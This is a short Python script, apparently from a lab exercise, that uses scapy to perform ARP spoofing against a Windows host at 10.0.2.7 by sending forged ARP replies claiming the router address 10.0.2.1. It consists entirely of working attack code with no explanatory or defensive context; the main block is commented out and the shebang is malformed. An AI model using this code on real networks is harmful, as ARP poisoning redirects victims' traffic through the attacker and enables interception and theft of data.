#!/usr/bin/env/ python

import scapy.all as scapy

ip_windows = "10.0.2.7"
ip_router = "10.0.2.1"


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    ether_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = ether_broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)






# if __name__ == "__main__":
#     pass